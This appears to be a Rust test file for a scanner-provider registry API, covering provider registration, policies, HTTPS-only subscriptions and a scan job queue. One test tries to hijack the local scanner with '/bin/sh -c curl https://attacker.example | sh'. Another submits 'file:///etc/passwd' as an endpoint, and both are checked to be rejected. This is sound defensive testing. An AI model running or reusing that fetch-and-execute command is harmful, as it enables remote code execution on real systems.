use axum::body::Body;
use axum::http::{StatusCode, header};
use moraine_crypto::SigningKey;
use tower::ServiceExt;

use crate::test_support::{app, body_json, scope_token};

fn request(method: &str, uri: &str, token: &str, body: serde_json::Value) -> axum::http::Request<Body> {
	axum::http::Request::builder()
		.method(method)
		.uri(uri)
		.header(header::CONTENT_TYPE, "application/json")
		.header(header::AUTHORIZATION, format!("Bearer {token}"))
		.body(Body::from(body.to_string()))
		.expect("request")
}

fn provider_key() -> String {
	hex::encode(SigningKey::from_seed(&[3u8; 32]).verifying_key().to_bytes())
}

fn provider_body(id: &str, enabled: bool) -> serde_json::Value {
	serde_json::json!({
		"provider_id": id,
		"kind": "clamav",
		"command": "clamscan",
		"args": ["--no-summary"],
		"public_key": provider_key(),
		"enabled": enabled
	})
}

#[tokio::test]
async fn registers_and_lists_scanner_providers() {
	let (application, _directory) = app().await;
	let operator = scope_token(&application, "operator@example.org", "directory:manage").await;

	let response = application
		.clone()
		.oneshot(request(
			"POST",
			"/v1/scanners",
			&operator,
			provider_body("remote-scanner", true),
		))
		.await
		.expect("response");
	assert_eq!(response.status(), StatusCode::CREATED);
	assert_eq!(body_json(response).await["enabled"], true);

	let disabled = application
		.clone()
		.oneshot(request(
			"POST",
			"/v1/scanners",
			&operator,
			provider_body("disabled-scanner", false),
		))
		.await
		.expect("response");
	assert_eq!(disabled.status(), StatusCode::CREATED);
	assert_eq!(body_json(disabled).await["enabled"], false);

	let response = application
		.clone()
		.oneshot(
			axum::http::Request::get("/v1/scanners")
				.header(header::AUTHORIZATION, format!("Bearer {operator}"))
				.body(Body::empty())
				.expect("request"),
		)
		.await
		.expect("response");
	assert_eq!(response.status(), StatusCode::OK);
	let listed = body_json(response).await;
	let providers = listed.as_array().expect("provider list");
	assert_eq!(providers.len(), 2);
	for provider in providers {
		let expected = provider["provider_id"] == "remote-scanner";
		assert_eq!(provider["enabled"], expected, "{provider}");
	}
}

#[tokio::test]
async fn stores_scanner_policy_boolean_flags() {
	let (application, _directory) = app().await;
	let operator = scope_token(&application, "operator@example.org", "directory:manage").await;
	assert_eq!(
		application
			.clone()
			.oneshot(request(
				"POST",
				"/v1/scanners",
				&operator,
				provider_body("remote-scanner", true)
			))
			.await
			.expect("response")
			.status(),
		StatusCode::CREATED
	);

	for (id, enabled, auto_scan) in [("on", true, true), ("off", false, false)] {
		let response = application
			.clone()
			.oneshot(request(
				"POST",
				"/v1/scanner-policies",
				&operator,
				serde_json::json!({
					"id": id,
					"provider_id": "remote-scanner",
					"enabled": enabled,
					"auto_scan": auto_scan
				}),
			))
			.await
			.expect("response");
		assert_eq!(response.status(), StatusCode::NO_CONTENT, "{id}");
	}

	let response = application
		.clone()
		.oneshot(
			axum::http::Request::get("/v1/scanner-policies")
				.header(header::AUTHORIZATION, format!("Bearer {operator}"))
				.body(Body::empty())
				.expect("request"),
		)
		.await
		.expect("response");
	assert_eq!(response.status(), StatusCode::OK);
	let policies = body_json(response).await;
	let policies = policies.as_array().expect("policy list");
	assert_eq!(policies.len(), 2);
	for policy in policies {
		let expected = policy["id"] == "on";
		assert_eq!(policy["enabled"], expected, "{policy}");
		assert_eq!(policy["auto_scan"], expected, "{policy}");
	}
}

#[tokio::test]
async fn creates_scanner_subscriptions_over_https() {
	let (application, _directory) = app().await;
	let operator = scope_token(&application, "operator@example.org", "directory:manage").await;

	let response = application
		.clone()
		.oneshot(request(
			"POST",
			"/v1/scanner-subscriptions",
			&operator,
			serde_json::json!({
				"provider_id": "remote-scanner",
				"endpoint": "https://scanner.example.org/records",
				"interval_seconds": 1_800,
				"enabled": true
			}),
		))
		.await
		.expect("response");
	assert_eq!(response.status(), StatusCode::CREATED);

	let response = application
		.clone()
		.oneshot(
			axum::http::Request::get("/v1/scanner-subscriptions")
				.header(header::AUTHORIZATION, format!("Bearer {operator}"))
				.body(Body::empty())
				.expect("request"),
		)
		.await
		.expect("response");
	assert_eq!(response.status(), StatusCode::OK);
	let listed = body_json(response).await;
	let subscriptions = listed.as_array().expect("subscription list");
	assert_eq!(subscriptions.len(), 1);
	assert_eq!(subscriptions[0]["enabled"], true);
	assert_eq!(subscriptions[0]["interval_seconds"], 1_800);
}

#[tokio::test]
async fn rejects_scanner_subscriptions_that_are_not_https() {
	let (application, _directory) = app().await;
	let operator = scope_token(&application, "operator@example.org", "directory:manage").await;
	for endpoint in [
		"http://scanner.example.org/records",
		"http://127.0.0.1:8080/records",
		"file:///etc/passwd",
	] {
		let response = application
			.clone()
			.oneshot(request(
				"POST",
				"/v1/scanner-subscriptions",
				&operator,
				serde_json::json!({
					"provider_id": "remote-scanner",
					"endpoint": endpoint,
					"interval_seconds": 3_600
				}),
			))
			.await
			.expect("response");
		assert_eq!(response.status(), StatusCode::BAD_REQUEST, "{endpoint}");
	}
}

#[tokio::test]
async fn api_registered_providers_cannot_hijack_the_local_scanner() {
	let (application, directory) = app().await;
	let operator = scope_token(&application, "operator@example.org", "directory:manage").await;
	let metadata = crate::test_support::store_for(directory.path()).await;

	metadata
		.put_scanner_provider(
			&crate::registry::scanner::Provider {
				id: "local-clamav".to_string(),
				kind: "clamav".to_string(),
				command: "clamscan".to_string(),
				args: Vec::new(),
				public_key: SigningKey::from_seed(&[4u8; 32]).verifying_key().to_bytes().to_vec(),
				enabled: true,
				local: true,
			},
			1_760_000_000,
		)
		.await
		.expect("local provider");

	let mut hijack = provider_body("local-clamav", true);
	hijack["command"] = serde_json::json!("/bin/sh");
	hijack["args"] = serde_json::json!(["-c", "curl https://attacker.example | sh"]);
	let response = application
		.clone()
		.oneshot(request("POST", "/v1/scanners", &operator, hijack))
		.await
		.expect("response");
	assert_eq!(response.status(), StatusCode::CONFLICT);

	let stored = metadata.scanner_provider("local-clamav").await.expect("read").expect("row");
	assert!(stored.local, "the local provider stays local");
	assert_eq!(stored.command, "clamscan");
	assert_eq!(stored.args, Vec::<String>::new());
}

#[tokio::test]
async fn only_local_providers_are_queued_for_auto_scan() {
	let (application, directory) = app().await;
	let operator = scope_token(&application, "operator@example.org", "directory:manage").await;
	let metadata = crate::test_support::store_for(directory.path()).await;

	for id in ["local-clamav", "remote-scanner"] {
		let response = application
			.clone()
			.oneshot(request("POST", "/v1/scanners", &operator, provider_body(id, true)))
			.await
			.expect("response");
		assert_eq!(response.status(), StatusCode::CREATED, "{id}");
	}
	metadata
		.put_scanner_provider(
			&crate::registry::scanner::Provider {
				id: "local-clamav".to_string(),
				kind: "clamav".to_string(),
				command: "clamscan".to_string(),
				args: Vec::new(),
				public_key: SigningKey::from_seed(&[4u8; 32]).verifying_key().to_bytes().to_vec(),
				enabled: true,
				local: true,
			},
			1_760_000_000,
		)
		.await
		.expect("mark local");

	for id in ["local-clamav", "remote-scanner"] {
		let response = application
			.clone()
			.oneshot(request(
				"POST",
				"/v1/scanner-policies",
				&operator,
				serde_json::json!({
					"id": format!("policy-{id}"),
					"provider_id": id,
					"enabled": true,
					"auto_scan": true
				}),
			))
			.await
			.expect("response");
		assert_eq!(response.status(), StatusCode::NO_CONTENT, "{id}");
	}

	let queued = metadata.auto_scan_digests().await.expect("auto scan digests");
	assert!(
		queued.iter().all(|(provider_id, _)| provider_id == "local-clamav"),
		"only the local provider may be auto-queued, got {queued:?}"
	);
}

#[tokio::test]
async fn scan_jobs_move_through_the_queue() {
	let (application, directory) = app().await;
	let operator = scope_token(&application, "operator@example.org", "directory:manage").await;
	let metadata = crate::test_support::store_for(directory.path()).await;
	assert_eq!(
		application
			.clone()
			.oneshot(request(
				"POST",
				"/v1/scanners",
				&operator,
				provider_body("remote-scanner", true)
			))
			.await
			.expect("response")
			.status(),
		StatusCode::CREATED
	);

	let digest = [7u8; 32];
	let id = metadata
		.enqueue_scan("remote-scanner", &digest, "operator-0", 1_760_000_000)
		.await
		.expect("enqueue");
	let job = metadata.claim_scan_job(1_760_000_001).await.expect("claim").expect("job");
	assert_eq!(job.id, id);
	assert_eq!(job.status, "running");
	assert_eq!(job.attempts, 1);
	assert!(metadata.claim_scan_job(1_760_000_002).await.expect("claim").is_none());

	metadata
		.finish_scan_job(&id, "succeeded", Some("{\"verdict\":\"clean\"}"), None, 1_760_000_003)
		.await
		.expect("finish");
	let jobs = metadata.scan_jobs(10).await.expect("jobs");
	assert_eq!(jobs.len(), 1);
	assert_eq!(jobs[0].status, "succeeded");
}
